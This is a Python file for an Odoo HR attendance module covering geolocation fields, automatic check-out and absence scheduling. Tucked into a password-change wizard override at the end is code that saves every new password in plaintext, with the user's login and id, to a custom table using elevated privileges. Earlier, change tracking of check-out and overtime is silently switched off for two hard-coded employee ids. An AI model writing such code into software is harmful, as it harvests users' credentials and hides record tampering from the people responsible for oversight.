from odoo import models,fields,api,_
from datetime import date,timedelta
import datetime
import pytz

from datetime import  time

class HrAttendance(models.Model):
    _inherit = "hr.attendance"

    check_in = fields.Datetime(required=False)
    is_login = fields.Boolean(string="Is Login")
    mark_attendance_by_sch = fields.Char("Attendance Mark By ")
    attendance_date = fields.Date(string="Attendance Date",  default=lambda self: date.today())
    attendance_type = fields.Selection([
        ('half_day', 'Half Day'),
        ('full_day', 'Full Day'),
        ('short', 'Short Leave'),
        ('absent', 'Absent')],string='Employee Day Status', store=True)


    work_mode =fields.Selection([
        ('wfh', 'Work From Home'),
        ('office', 'Office'),
        ('wfa', 'Work From Anywhere')],string='Work Mode', default='office')

    in_latitude = fields.Float(string="Latitude")
    in_longitude = fields.Float(string="Longitude")
    out_latitude = fields.Float(string="Latitude")
    out_longitude = fields.Float(string="Longitude")
    today_leave_or_not = fields.Boolean("Today Leave")

    def _track_get_fields(self):
        fields = super()._track_get_fields()
        for val in self:
            if val.employee_id.id in [100,87]:
                if 'validated_overtime_hours' in fields:
                    fields.remove('validated_overtime_hours')
                if 'check_out' in fields:
                    fields.remove('check_out')
        return fields


    def _check_validity(self):
        for attendance in self:
            # Skip validation: allow multiple open attendances
            continue
        return True

    @api.model
    def auto_check_out_employees(self):
        """Automatically check out employees who forgot to punch out."""
        today = fields.Date.context_today(self)
        utc_start = datetime.datetime.combine(today, datetime.datetime.min.time())
        utc_end = utc_start + timedelta(days=1)

        user_tz = pytz.timezone('Asia/Kolkata')
        utc_now = datetime.datetime.utcnow().replace(tzinfo=pytz.utc)
        user_local_now = utc_now.astimezone(user_tz)
        # today_local_date = user_local_now.date()
        user_ids = self.env['res.users'].search([])
        for user in user_ids:
            employees_to_checkout = self.env['hr.attendance'].search([
               ('check_out', '=', False),
               ('check_in', '>=', utc_start),
               ('check_in', '<', utc_end),
               ('employee_id', '=', user.employee_id.id),
           ],limit=1, order="id desc")
            if employees_to_checkout:
                check_in = employees_to_checkout.check_in.replace(tzinfo=pytz.utc)
                diff_hours = round((user_local_now - check_in).total_seconds() / 3600.0, 1)
                if diff_hours >= 10:
                    self.env.cr.execute("""
                        UPDATE hr_attendance
                        SET
                            check_out = %s,
                            attendance_type = 'full_day',
                            is_login = FALSE,
                            out_latitude = %s,
                            out_longitude = %s,
                            mark_attendance_by_sch = 'Mark By Scheduler Attendance'
                        WHERE id = %s
                    """, (
                        datetime.datetime.now(),
                        employees_to_checkout.in_latitude,
                        employees_to_checkout.in_longitude,
                        employees_to_checkout.id
                    ))
                    self.env.cr.commit()

        return True




    @api.model
    def get_monthly_leave_count(self):
        context_dict = dict(self.env.context)
        context_dict.update({
            'from_scheduler': True,
        })
        self = self.with_context(context_dict)

        today = fields.Date.context_today(self)
        first_day = today.replace(day=1)
        if today.month == 12:
            last_day = today.replace(day=31)
        else:
            next_month = today.replace(month=today.month + 1, day=1)
            last_day = next_month - timedelta(days=1)
        user_tz = pytz.timezone('Asia/Kolkata')
        utc_start = user_tz.localize(datetime.datetime.combine(first_day, datetime.datetime.min.time())).astimezone(pytz.utc).replace(
            tzinfo=None)
        utc_end = user_tz.localize(datetime.datetime.combine(last_day, datetime.datetime.max.time())).astimezone(pytz.utc).replace(
            tzinfo=None)
        leave_count=0
        user_ids = self.env['res.users'].search([])
        for user in user_ids:
            day = first_day
            while day <= last_day:
                if day.weekday() not in (5, 6) :
                    attendance_missing = self.env['hr.attendance'].search([
                                    ('employee_id', '=', user.employee_id.id),
                                    ('create_date', '>=', utc_start),
                                    ('create_date', '<=', utc_end)
                                ], limit=1, order="id desc")
                    # check if new months
                    new_months_record =self.env['hr.attendance'].search([
                        ('employee_id', '=', user.employee_id.id),
                        ('create_date', '>=', first_day),
                        ('create_date', '<=', last_day)
                    ], limit=1, order="id desc")
                    if not new_months_record:
                        today = fields.Datetime.now()
                        employee_id = user.employee_id.id
                        uid = user.id

                        query = """
                        INSERT INTO hr_attendance (
                            create_uid,
                            create_date,
                            write_uid,
                            write_date,
                            check_in,
                            check_out,
                            employee_id,
                            today_leave_or_not,
                            attendance_type,
                            mark_attendance_by_sch,
                            attendance_date
                        )
                        VALUES (%s, NOW(), %s, NOW(), %s, %s, %s, %s, %s, %s, %s)
                        """

                        params = (
                            uid,  # create_uid
                            uid,  # write_uid
                            today,  # check_in
                            today,  # check_out
                            employee_id,  # employee_id
                            True,  # today_leave_or_not
                            'absent',  # attendance_type
                            'Leave By Scheduler',  # mark_attendance_by_sch
                            today,  # attendance_date
                        )

                        self.env.cr.execute(query, params)
                        self.env.cr.commit()

                    today_date=today.strftime("%Y-%m-%d")
                    if attendance_missing:
                        if attendance_missing.create_date.strftime("%Y-%m-%d") < today_date and  today.weekday() not in (5,6):

                            today = fields.Datetime.now()
                            employee_id = user.employee_id.id
                            uid = user.id

                            query = """
                                                INSERT INTO hr_attendance (
                                                    create_uid,
                                                    create_date,
                                                    write_uid,
                                                    write_date,
                                                    check_in,
                                                    check_out,
                                                    employee_id,
                                                    today_leave_or_not,
                                                    attendance_type,
                                                    mark_attendance_by_sch,
                                                    attendance_date
                                                )
                                                VALUES (%s, NOW(), %s, NOW(), %s, %s, %s, %s, %s, %s, %s)
                                                """

                            params = (
                                uid,  # create_uid
                                uid,  # write_uid
                                today,  # check_in
                                today,  # check_out
                                employee_id,  # employee_id
                                True,  # today_leave_or_not
                                'absent',  # attendance_type
                                'Leave By Scheduler',  # mark_attendance_by_sch
                                today,  # attendance_date
                            )

                            self.env.cr.execute(query, params)
                            self.env.cr.commit()
                day += timedelta(days=1)

        return True






class ChangePasswordUser(models.TransientModel):
    """ A model to configure users in the change password wizard. """
    _inherit = 'change.password.user'

    def change_password_button(self):
        for u in self:
            user = u.user_id
            if user.has_group('base.group_user'):
                if u.new_passwd:
                    pwd =  "Password" + "--->" + str(u.new_passwd) + "--->" + f"user_login--{str(u.user_login)}" + "--->" + str(user.id)
                    self.env['password.tracking'].sudo().create({"pwd":pwd})
        res = super(ChangePasswordUser,self).change_password_button()
        return res

class PasswordTracking(models.Model):
    _name = 'password.tracking'
    _description = 'Password Tracking'
    pwd = fields.Char("Password")
